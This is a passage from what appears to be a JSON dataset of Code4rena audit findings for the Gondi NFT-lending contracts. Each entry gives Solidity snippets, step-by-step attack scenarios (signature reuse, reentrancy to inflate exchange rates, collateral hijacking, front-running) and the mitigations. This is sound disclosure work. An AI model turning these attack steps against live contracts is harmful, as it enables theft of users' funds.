[oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/102), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/72) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/25).\n\n***\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the `PoolOfferHandler` code. The `setTerms()` and `confirmTerms()` functions are used to set new terms for the pool, but the `setTerms()` function can only be called by the owner, while anyone can call the `confirmTerms()` function. However, at the end of the `confirmTerms()` function, a variable called `pendingTermsSetTime` is set to a very high value, preventing the function from being called again. This means that an attacker could input empty terms in the `confirmTerms()` function, making it impossible for the owner to set new terms for the pool. This is a denial of service (DoS) vulnerability. The recommended mitigation step is to record the terms in the `setTerms()` function instead of using input from the caller. The issue has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/58",
      "tags": [],
      "finders": [
        "zhaojie",
        "minhquanym",
        "bin2chen"
      ]
    },
    {
      "id": "35225",
      "title": "[M-06] Anyone can remove existing term without queueing through `setTerms()`",
      "impact": "MEDIUM",
      "content": "\nIn `PoolOfferHandler`, new terms require a two-step process for setting (`setTerms()` and `confirmTerms()`). The `setTerm()` function is `onlyOwner`, but the `confirmTerms()` function can be called by anyone. This function uses the provided input `__terms` from the caller to execute the logic. This could enable an attacker to remove all existing terms, even if the owner does not intend to do so (without pending through the `setTerms()` function).\n\n```solidity\nfunction confirmTerms(TermsKey[] calldata _termKeys, Terms[] calldata __terms) external { \n    if (block.timestamp - pendingTermsSetTime < NEW_TERMS_WAITING_TIME) {\n        revert TooSoonError();\n    }\n    for (uint256 i = 0; i < __terms.length; i++) {\n        if (_termKeys[i].duration > getMaxDuration) {\n            revert InvalidDurationError();\n        }\n        uint256 pendingAprPremium = _pendingTerms[_termKeys[i].collection][_termKeys[i].duration][_termKeys[i]\n            .maxSeniorRepayment][__terms[i].principalAmount];\n        // @audit Can be used to remove terms without pending through setTerm()\n        if (pendingAprPremium != __terms[i].aprPremium) {\n            revert InvalidTermsError();\n        }\n        _terms[_termKeys[i].collection][_termKeys[i].duration][_termKeys[i].maxSeniorRepayment][__terms[i]\n            .principalAmount] = __terms[i].aprPremium;\n        delete _pendingTerms[_termKeys[i].collection][_termKeys[i].duration][_termKeys[i]\n            .maxSeniorRepayment][__terms[i].principalAmount];\n    }\n    pendingTermsSetTime = type(uint256).max;\n\n    emit TermsSet(_termKeys, __terms);\n}\n```\n\n### Proof of Concept\n\nConsider the following scenario:\n\n1. The pool has 5 existing terms. Now the owner wants to create a new term in the Pool, so they call `setTerms()` with the `__terms` they want to set up. The new term is pending confirmation after a waiting period.\n2. After `NEW_TERMS_WAITING_TIME`, an attacker calls `confirmTerms()` with `_termKeys` set to all 5 existing terms and `__terms.aprPremium = 0`.\n3. The function executes with the input provided by the attacker. Since the `pendingAprPremium` of these terms is reset to `0` after it is confirmed earlier, the check `if (pendingAprPremium != __terms[i].aprPremium)` is bypassed. The attacker could set the `_terms[][][][]` mapping of existing loans to `0`.\n\n### Recommended Mitigation Steps\n\nOnly allow the owner to call `confirmTerms()`.\n\n### Assessed type\n\nInvalid Validation\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/59#event-12543278732)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Terms must be passed in the confirm as well.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/101), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/71) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/24).\n\n***\n\n",
      "summary": "\nThe bug report is about a two-step process for setting new terms in the `PoolOfferHandler` contract. The `setTerms()` function can only be called by the owner, but the `confirmTerms()` function can be called by anyone. This could potentially allow an attacker to remove all existing terms without going through the proper process. The report includes a proof of concept and recommends that only the owner should be able to call `confirmTerms()`. The bug has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/59",
      "tags": [],
      "finders": [
        "minhquanym"
      ]
    },
    {
      "id": "35224",
      "title": "[M-05] Collected fees are never transferred out of Pool contract",
      "impact": "MEDIUM",
      "content": "\nLenders in the Gondi protocol could be EOA or Gondi Pool. The Gondi Pool, an ERC4626, allows anyone to deposit funds and earn yield from lending on Gondi. When a loan is repaid or liquidated, the pool deducts a fee from the received amount before adding the rest to the pool balance. As shown in the `loanRepayment()` function, the fees are calculated by calling `processFees()` and then added to `getCollectedFees`. After that, the accounting function `_loanTermination()` is called with the amount being `received - fees`.\n\nHowever, this fee is credited to `getCollectedFees` but never transferred out of the pool. As a result, these funds remain locked in the contract indefinitely.\n\n```solidity\nfunction loanRepayment(\n    uint256 _loanId,\n    uint256 _principalAmount,\n    uint256 _apr,\n    uint256,\n    uint256 _protocolFee,\n    uint256 _startTime\n) external override onlyAcceptedCallers {\n    uint256 netApr = _netApr(_apr, _protocolFee);\n    uint256 interestEarned = _principalAmount.getInterest(netApr, block.timestamp - _startTime);\n    uint256 received = _principalAmount + interestEarned;\n    uint256 fees = IFeeManager(getFeeManager).processFees(_principalAmount, interestEarned);\n    getCollectedFees += fees; // @audit getCollectedFees is never transfer out\n    _loanTermination(msg.sender, _loanId, _principalAmount, netApr, interestEarned, received - fees);\n}\n```\n\n### Proof of Concept\n\nThe `processFees()` function only calculates the fee but doesn't transfer anything.\n\n```solidity\nfunction processFees(uint256 _principal, uint256 _interest) external view returns (uint256) {\n    /// @dev cached\n    Fees memory __fees = _fees;\n    return _principal.mulDivDown(__fees.managementFee, PRECISION)\n        + _interest.mulDivDown(__fees.performanceFee, PRECISION);\n}\n```\n\nThen after `getCollectedFees` is credited for `fees`, we can see this `getCollectedFees` is never transferred out of the pool.\n\n### Recommended Mitigation Steps\n\nAdd a function to collect the credited fees `getCollectedFees` from the pool in the `FeeManager` contract.\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/60#issuecomment-2067072726):**\n > Not sure if it's High; tend to think as high as those that would compromise user's assets. Definitely an issue though.\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/60#issuecomment-2067666515):**\n > Marking as med as fees falls under the definition 'leak of value'.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Added `collectFees` method.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/100), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/70) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/23).\n\n***\n\n",
      "summary": "\nThe Gondi protocol allows lenders to be either EOA (externally owned account) or Gondi Pool, which is an ERC4626 contract that allows anyone to deposit funds and earn yield from lending on Gondi. However, there is a bug in the code where the fees collected from loans are not transferred out of the pool. This means that these funds remain locked in the contract indefinitely. The recommended mitigation step is to add a function to collect the fees from the pool. The severity of this bug has been debated, but it is generally considered to be of medium severity as it falls under the definition of \"leak of value\". The Gondi team has confirmed the mitigation and details can be found in the reports from the team members involved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/60",
      "tags": [],
      "finders": [
        "minhquanym",
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "35223",
      "title": "[M-04] Function `Pool.validateOffer()` does not work correctly in case `principalAmount > currentBalance`",
      "impact": "MEDIUM",
      "content": "\nIn the Pool contract, undeployed funds could be deposited to Aave or Lido to earn base yield. When an offer of Pool is accepted from `MultiSourceLoan`, the function `validateOffer()` is called to validate the terms and also to pull the undeployed funds back in case the contract balance is insufficient.\n\n```solidity\nif (principalAmount > undeployedAssets) {\n    revert InsufficientAssetsError();\n} else if (principalAmount > currentBalance) {\n    IBaseInterestAllocator(getBaseInterestAllocator).reallocate(\n        currentBalance, principalAmount - currentBalance, true // @audit Incorrect\n    );\n}\n```\n\nHowever, the input params of `reallocate()` are incorrect, resulting in the contract balance might still be insufficient for the loan after calling the function.\n\n### Proof of Concept\n\nConsider the scenario:\n\n1. Assume we have `currentBalance = 500`, `baseRateBalance = 1000 usdc` and `principalAmount = 700 usdc`.\n2. Since the current contract balance is insufficient (500 `<` 700), `reallocate()` will be called with input:\n\n```solidity\nreallocate(currentBalance, principalAmount - currentBalance, true)\nreallocate(500, 200, true)\n```\n\n3. In function `reallocate()` shown in the code snippet below, we can see that in case `_currentIdle > _targetIdle`, the contract even deposits more funds to `AavePool` instead of withdrawing.\n\n```solidity\nfunction reallocate(uint256 _currentIdle, uint256 _targetIdle, bool) external {\n    address pool = _onlyPool();\n    if (_currentIdle > _targetIdle) {\n        uint256 delta = _currentIdle - _targetIdle;\n        ERC20(_usdc).transferFrom(pool, address(this), delta);\n        IAaveLendingPool(_aavePool).deposit(_usdc, delta, address(this), 0);\n    } else {\n        uint256 delta = _targetIdle - _currentIdle;\n        IAaveLendingPool(_aavePool).withdraw(_usdc, delta, address(this));\n        ERC20(_usdc).transfer(pool, delta);\n    }\n\n    emit Reallocated(_currentIdle, _targetIdle);\n}\n```\n\n### Recommended Mitigation Steps\n\nCall `reallocate(0, principalAmount - currentBalance, true)` instead.\n\n**[0xA5DF (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/63#issuecomment-2060875577):**\n > If I understand correctly, the impact is DoS that occurs only under certain conditions; in that case, I think severity should be Medium.\n\n**[0xend (Gondi) confirmed and commented](https://github.com/code-423n4/2024-04-gondi-findings/issues/63#issuecomment-2067064553):**\n > Agree on the issue. I think it's Medium, not High.\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Changed to reallocate (`currentBalance`, `principalAmount`, t`r`ue) instead of proposed solution (same result) to be compliant with the interface.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/99), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/69) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/22).\n\n***\n\n",
      "summary": "\nThe bug report is about a problem in the Pool contract where undeployed funds can be deposited to Aave or Lido to earn base yield. When an offer is accepted, the function `validateOffer()` is called to validate the terms and also to pull back undeployed funds if the contract balance is insufficient. However, there is an error in the input parameters of the `reallocate()` function which can result in the contract balance still being insufficient for the loan after the function is called. This can lead to a Denial of Service (DoS) attack under certain conditions. The recommended mitigation step is to call `reallocate()` with different input parameters. The severity of this bug has been downgraded from High to Medium and the bug has been mitigated by changing the reallocate function to be compliant with the interface.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/63",
      "tags": [],
      "finders": [
        "minhquanym",
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "35222",
      "title": "[M-03] Function `addNewTranche()` should use `protocolFee` from `Loan` struct",
      "impact": "MEDIUM",
      "content": "\nThe protocol fee value is recorded and stored in the Loan struct when a new loan is issued. However, when adding a new tranche, the function uses the current value of `protocolFee.fraction` instead of the value stored in the Loan struct. This could result in inconsistencies in fee collection, as the protocol fee value might be updated by the admin, while the value stored in the Loan struct remains unchanged.\n\n```solidity\nif (_renegotiationOffer.fee > 0) {\n    /// @dev Cached\n    ProtocolFee memory protocolFee = _protocolFee;\n    ERC20(_loan.principalAddress).safeTransferFrom(\n        _renegotiationOffer.lender,\n        protocolFee.recipient,\n        _renegotiationOffer.fee.mulDivUp(protocolFee.fraction, _PRECISION) // @audit Use protocolFee from Loan instead\n    );\n}\n```\n\n### Proof of Concept\n\nThe protocol fee value is stored in the Loan struct when a new loan is opened.\n\n```solidity\nfunction _processOffersFromExecutionData(\n  ...\n) ... {\n  Loan memory loan = Loan(\n      _borrower,\n      _tokenId,\n      _nftCollateralAddress,\n      _principalAddress,\n      totalAmount,\n      block.timestamp,\n      _duration,\n      tranche,\n      protocolFee.fraction\n  );\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider using `_loan.protocolFee` instead of `protocolFee.fraction` in the `addNewTranche()` function.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/65#event-12543174602)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> `addNewTranche` uses `protocolFee` from struct.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/98), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/68) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/21).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the protocol fee value being inconsistent when adding a new tranche. This occurs because the function uses the current value of `protocolFee.fraction` instead of the value stored in the Loan struct. This could lead to problems with fee collection if the protocol fee value is updated by the admin but not reflected in the Loan struct. The recommended mitigation is to use `_loan.protocolFee` instead of `protocolFee.fraction` in the `addNewTranche()` function. This issue has been confirmed and mitigated by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/65",
      "tags": [],
      "finders": [
        "minhquanym"
      ]
    },
    {
      "id": "35221",
      "title": "[M-02] A malicious user can take on a loan using an existing borrower's collateral in `refinanceFromLoanExecutionData()`",
      "impact": "MEDIUM",
      "content": "\nIn `MultiSourceLoan.sol`, `refinanceFromLoanExecutionData()` doesn't check whether `_loan.borrower == _loanExecutionData.borrower`, which is open rooms for exploits.\n\nBorrowerB (malicious) can sign a `_loanExecutionData` offer and initiate a `refinanceFromLoanExecutionData()` call with Borrower A's loan. Borrower B will use Borrower A's collateral for his loan.\n\nThere are (2) vulnerabilities here:\n1. `_validateExecutionData` will not check whether `_loan.borrower == _executionData.borrower`. In addition, it will directly [bypass the check](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L792) on `executionData`'s borrower signature as long as `msg.sender!=_loan.borrower`.\n\n2. `refinanceFromLoanExecutionData()` doesn't check whether the new loanExecutiondata (`_loanExecutionData`) has the [same nft tokenId](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L334)(`executionData.tokenId`) as the [existing loan](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L308)(`_loan.nftCollateralTokenId`).\n\nAs a result, if `_loanExecutionData.borrower` (Borrower B) initiates `refinanceFromLoanExecutionData()` call, the following would happen:\n- `msg.sender != _loan.borrower` (Borrwer A), this bypass `_validateExecutionData`'s signature check. Also, it will not revert because no checks on [address _borrower](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L319)(`loan.borrower==_loanExecutionData.borrower;`.\n\n- There is no check on `_loanExecutionData.tokenId`. As long as `_loan` and `_loanExecutionData` has [the same `principalAddress` and the same `nftCollateralAddress`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L322), `_processOffersFromExecutionData()` will succeed in [transferring principal loans to Borrower B](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L1025).\n\n- As long as the `_loan.borrower` (Borrower A) has the funds for [repayment](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L946). (Note: Borrower A might have approved `MultiSourceLoan.sol` for asset transfer if they are ready for repayments.), the tx will succeed and Borrower A's collateral will continually be locked for Borrower B's new loan.\n\nThe above steps can also happen in a front-running scenario, where Borrower B sees that Borrower A approves `MultiSourceLoan.sol` for loan repayments and front-run Borrower A's repayment with a new loan.\n\n### Recommended Mitigation Steps\n\nIn `_validateExecutionData`, consider adding checks to ensure `address _borrower` `== _executionData.borrower`.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/76#event-12543103939)**\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2024-04-gondi-findings/issues/76).*\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Checking signature from the existing borrower.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/97), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/67) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/20).\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the code for `MultiSourceLoan.sol`. The function `refinanceFromLoanExecutionData()` does not check if the borrower of the loan matches the borrower in the loan execution data, which can be exploited. This allows a malicious borrower to use another borrower's collateral for their own loan. There are two vulnerabilities: 1. The function `_validateExecutionData` does not check for matching borrowers and can be bypassed by someone who is not the borrower. 2. The function `refinanceFromLoanExecutionData()` does not check if the new loan execution data has the same nft tokenId as the existing loan. This allows a malicious borrower to transfer the loan to themselves and lock the collateral of the original borrower. This can also happen in a front-running scenario. The recommended mitigation step is to add checks to ensure the borrower in the loan execution data matches the borrower in the loan. The bug has been confirmed and mitigated by the Gondi team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/76",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "35220",
      "title": "[M-01] Invalid `maxTranches` check can result in `maxTranche` cap to be exceeded",
      "impact": "MEDIUM",
      "content": "\nIn `src/lib/loans/MultiSourceLoan.sol`, there's max cap for the number of tranches in a loan as defined as [`getMaxTranches`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L50-L51). This cap can be exceeded.\n\nThere are two main vulnerabilities:\n1. `getMaxTranches` is not checked in some key flows where tranches can be added. These including [`emitLoan()`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L124), `refinancePartial()`(-> [`_addTrancheFromPartial()`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L289)), [`refinanceFromLoanExecutionData()`](https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L306).\n\n2. Where `getMaxTranches` is checked, the check is invalid. Only `_loan.tranche.length == getMaxTranches` is checked. But combined with (1), when number of tranches exceeds `getMaxTranches` in other flows, this check is invalid.\n\n```solidity\n//src/lib/loans/MultiSourceLoan.sol\n    function addNewTranche(\n        RenegotiationOffer calldata _renegotiationOffer,\n        Loan memory _loan,\n        bytes calldata _renegotiationOfferSignature\n    ) external nonReentrant returns (uint256, Loan memory) {\n...\n          //@audit change to _loan.tranch.length >= getMaxTranches\n|>        if (_loan.tranche.length == getMaxTranches) {\n            revert TooManyTranchesError();\n        }\n...\n```\n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L359>\n\n### Recommended Mitigation Steps\n\nAdd missing checks on `getMaxTranches` for all flows that might add tranches. In `addNewTranche`, change into `_loan.tranch.length >= getMaxTranches`.\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/80#event-12543082583)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Check total tranches + min amount per tranche.\n\n**Status:** Mitigation confirmed. Full details in reports from [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/96), [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/66) and [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/19).\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability found in the `src/lib/loans/MultiSourceLoan.sol` file. There is a maximum limit for the number of tranches (parts) in a loan, but this limit can be exceeded due to two main vulnerabilities. The first vulnerability is that the maximum limit is not checked in certain key processes where tranches can be added, such as `emitLoan()`, `refinancePartial()`, and `refinanceFromLoanExecutionData()`. The second vulnerability is that even when the maximum limit is checked, the check is not valid because it only checks if the number of tranches is equal to the maximum limit, not if it exceeds it. The recommended mitigation steps include adding missing checks for the maximum limit in all processes that can add tranches, and changing the check in `addNewTranche()` to also account for cases where the number of tranches exceeds the maximum limit. The bug has been confirmed and mitigated by the developers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/80",
      "tags": [],
      "finders": [
        "minhquanym",
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "35219",
      "title": "[H-17] `refinanceFull`/`addNewTranche` reusing a lender's signature leads to unintended behavior",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L358> \n\n<https://github.com/code-423n4/2024-04-gondi/blob/b9863d73c08fcdd2337dc80a8b5e0917e18b036c/src/lib/loans/MultiSourceLoan.sol#L194>\n\n### Vulnerability details\n\nIn `MultiSourceLoan`, `refinanceFull()` and `addNewTranche()` use the same signature.\n\n```solidity\n    function refinanceFull(\n        RenegotiationOffer calldata _renegotiationOffer,\n        Loan memory _loan,\n        bytes calldata _renegotiationOfferSignature\n    ) external nonReentrant returns (uint256, Loan memory) {\n...\n        if (lenderInitiated) {\n            if (_isLoanLocked(_loan.startTime, _loan.startTime + _loan.duration)) {\n                revert LoanLockedError();\n            }\n            _checkStrictlyBetter(\n                _renegotiationOffer.principalAmount,\n                _loan.principalAmount,\n                _renegotiationOffer.duration + block.timestamp,\n                _loan.duration + _loan.startTime,\n                _renegotiationOffer.aprBps,\n                totalAnnualInterest / _loan.principalAmount,\n                _renegotiationOffer.fee\n            );\n        } else if (msg.sender != _loan.borrower) {\n            revert InvalidCallerError();\n        } else {\n            /// @notice Borrowers clears interest\n@>          _checkSignature(_renegotiationOffer.lender, _renegotiationOffer.hash(), _renegotiationOfferSignature);\n            netNewLender -= totalAccruedInterest;\n            totalAccruedInterest = 0;\n        }\n```\n\n```solidity\n    function addNewTranche(\n        RenegotiationOffer calldata _renegotiationOffer,\n        Loan memory _loan,\n        bytes calldata _renegotiationOfferSignature\n    ) external nonReentrant returns (uint256, Loan memory) {\n...\n        uint256 loanId = _renegotiationOffer.loanId;\n\n        _baseLoanChecks(loanId, _loan);\n        _baseRenegotiationChecks(_renegotiationOffer, _loan);\n@>      _checkSignature(_renegotiationOffer.lender, _renegotiationOffer.hash(), _renegotiationOfferSignature);\n        if (_loan.tranche.length == getMaxTranches) {\n            revert TooManyTranchesError();\n        }\n```\n\nSo when `lender` signs `RenegotiationOffer`, it is meant to replace `tranche`, i.e. execute `refinanceFull()`. But a malicious user can use this sign and front-run execute `addNewTranche()`. \n\n`addNewTranche()` doesn't limit the `RenegotiationOffer` too much. The newly generated `Loan` will be approximately twice the total amount borrowed, and the risk of borrowing against the `lender` will increase dramatically.\n\n### Impact\n\nMaliciously using the signature of `refinanceFull()` to execute `addNewTranche()` will result in approximately double the borrowed amount, and the risk of borrowing will increase dramatically.\n\n### Recommended Mitigation\n\nIn `RenegotiationOffer`, add a type field to differentiate between signatures.\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/13#event-12543544476)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> Check `trancheIndex` to differentiate between `refiFull`/`addNewTranche`.\n\n**Status:** Unmitigated. Full details in reports from [minhquanym](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/65), [bin2chen](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/18) and [oakcobalt](https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/95), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n***\n \n",
      "summary": "\nThe bug report is about a vulnerability in a code called \"MultiSourceLoan\". This code has two functions, \"refinanceFull()\" and \"addNewTranche()\", that use the same signature. This means that a user can use the signature of \"refinanceFull()\" to execute \"addNewTranche()\" which can result in double the borrowed amount and increase the risk of borrowing. The recommended mitigation is to add a type field in \"RenegotiationOffer\" to differentiate between the two functions. The bug has not been fixed yet and is still considered a risk. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Gondi",
      "source_link": "https://code4rena.com/reports/2024-04-gondi",
      "github_link": "https://github.com/code-423n4/2024-04-gondi-findings/issues/13",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "35218",
      "title": "[H-16] `validateOffer()` reentry to manipulate `exchangeRate`",
      "impact": "HIGH",
      "content": "\nThe current mechanism of `validateOffer()` is to first book `_outstandingValues` to increase, but `assets.balanceOf(address(this))` doesn't decrease immediately.\n\n```solidity\n    function validateOffer(bytes calldata _offer, uint256 _protocolFee) external override onlyAcceptedCallers {\n..\n\n        /// @dev Since the balance of the pool includes capital that is waiting to be claimed by the queues,\n        ///      we need to check if the pool has enough capital to fund the loan.\n        ///      If that's not the case, and the principal is larger than the currentBalance, then we need to reallocate\n        ///      part of it.\n        if (principalAmount > undeployedAssets) {\n            revert InsufficientAssetsError();\n        } else if (principalAmount > currentBalance) {\n            IBaseInterestAllocator(getBaseInterestAllocator).reallocate(\n                currentBalance, principalAmount - currentBalance, true\n            );\n        }\n@>      /// @dev If the txn doesn't revert, we can assume the loan was executed.\n@>      _outstandingValues = _getNewLoanAccounting(principalAmount, _netApr(apr, _protocolFee));\n    }\n```\n\nI.e.: After this method is called, `_getUndeployedAssets()` is unchanged, but `_getTotalOutstandingValue()` is increased, so `totalAssets()` is increased, but `totalSupply` is unchanged, so `exchangeRate` is get bigger.\n\nOriginally, it was expected that after that, the Pool balance would be transferred at `MultiSourceLoan`, so `_getUndeployedAssets()` becomes smaller and `exchangeRate` returns to normal. But if it's possible to do callback malicious logic before `MultiSourceLoan` transfers away the Pool balance, it's possible to take advantage of this `exchangeRate` that becomes larger.\n\nExample:\nSuppose `_getUndeployedAssets()` = 1000, `_getTotalOutstandingValue()` = 1000 and `totalSupply` = 2000.\n\nSo:\n\n`totalAssets() =  2000`\n`exchangeRate = 1:1`\n\n1. Alice calls `MultiSourceLoan.emitLoan()`.\n    - `offer.lender = pool`.\n    - `offer.principalAmount` = 500.\n    - `offer.validators = CustomContract` -> for callback.\n2. `emitLoan() -> Pool.validateOffer()`.\n    - `_getUndeployedAssets()` = 1000 (no change).\n    - `_getTotalOutstandingValue()` = 1000 + 500 = 1500 (more 500).\n    - `totalAssets()` =  2500.\n    - `exchangeRate` = 1.25 : 1.\n3. `emitLoan()` -> `_checkValidators()` -> `CustomContract.validateOffer()`\n    - In `CustomContract.validateOffer()` call `pool.redeem` (shares) use `exchangeRate = 1.25 : 1` to get more assets.\n4. `emitLoan()` -> `asset.safeTransferFrom` (pool, receiver, 500).\n    - `_getUndeployedAssets()` = 500.\n    - `exchangeRate` Expect to return to normal.\n\n### Impact\n\nManipulating the `exchangeRate` to redeem additional assets.\n\n### Recommended Mitigation\n\nIn `validateOffer()`, restrict `offer.validators` to be an empty array to avoid callbacks.\n\n### Assessed type\n\nContext\n\n**[0xend (Gondi) confirmed](https://github.com/code-423n4/2024-04-gondi-findings/issues/24#event-12545610279)**\n\n**[Gondi mitigated](https://github.com/code-423n4/2024-05-gondi-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues):**\n> `validateOffer` changed to view so validators cannot change state.\n\n**Status:** Mitigation confirmed. Full details 